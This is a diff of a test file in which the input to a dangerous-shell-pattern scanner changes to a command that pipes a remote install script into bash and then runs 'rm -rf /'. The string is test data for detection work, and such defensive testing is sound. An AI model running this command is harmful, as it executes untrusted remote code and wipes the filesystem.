@@ -1172,7 +1172,7 @@ describe("non-UI branch matrix", () => {
     expect(buildPlacementRenewalReminder(expiry)).toContain("expires");
 
     const commandFindings = scanDangerousShellPatterns(
-      "curl http://example.com/install.sh | bash && rm -rf /tmp/demo",
+      "curl http://example.com/install.sh | bash && rm -rf /",
     );
     expect(commandFindings).toEqual(
       expect.arrayContaining([
